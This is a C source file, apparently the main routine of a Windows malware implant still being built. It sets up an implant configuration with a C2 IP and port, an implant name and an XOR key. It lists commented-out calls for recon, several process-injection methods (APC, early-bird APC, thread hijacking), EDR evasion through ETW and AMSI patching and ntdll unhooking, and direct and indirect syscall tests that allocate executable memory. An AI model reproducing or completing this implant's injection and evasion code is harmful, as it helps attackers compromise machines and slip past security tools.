#include <stdio.h>
#include "config.h"
#include "recon.h"
#include "injection.h"
#include "evasion.h"

int main(VOID)

{
	//doesn't do anything yet
	IMPLANT_CONFIG config = { "192.168.1.1", 4444, 60, "BASTILA", 0x42 };
	//printf("CONFIG: %s %d %d %s %X\n", 
	// config.c2ip, config.port, 
	// config.sleep_interval, 
	// config.implant_name, 
	// config.xor_key);
	
	// RECON
	//collect_recon();

	// INJECTION
	//inject_self(config);
	//remote_inject();
	//apc_inject(config);
	//early_apc_inject(config);
	//thread_hijack(config);
	
	// EVASION
	//EdrHookerCheck();
	//EtwPatch();
	//unhook_Ntdll();R
	//AmsiPatch();	
	
	// SYSCALL TEST
	//printf("SSN: %d\n", getSSN("NtAllocateVirtualMemory"));
	//PVOID base = NULL;
	//SIZE_T size = 4096;
	//g_ssn = getSSN("NtAllocateVirtualMemory");
	//NTSTATUS status = NtAllocateVirtualMemory(
	//	GetCurrentProcess(),           // target process handle
	//	&base,              // kernel writes allocated address here
	//	0,                  // zero bits
	//	&size,              // kernel writes actual size here
	//	MEM_COMMIT | MEM_RESERVE,
	//	PAGE_EXECUTE_READWRITE
	//);
	//if (status == 0) {
	//	printf("[+] Allocated at: %p\n", base);
	//}

	// INDIRECT SYSCALL TEST
//	g_ssn = getSSN("NtAllocateVirtualMemory");
//	g_syscall = getSyscallAddr("NtAllocateVirtualMemory");
//	PVOID base = NULL;
//	SIZE_T size = 4096;
//	Sleep(120000);
//	NTSTATUS status = iNtAllocateVirtualMemory(GetCurrentProcess(),           // target process handle
//			&base,              // kernel writes allocated address here
//			0,                  // zero bits
//			&size,              // kernel writes actual size here
//			MEM_COMMIT | MEM_RESERVE,
//			PAGE_EXECUTE_READWRITE
//		);
//	if (status == 0) {
//	printf("[+] Allocated at: %p\n", base);
//}







	return 0;
}



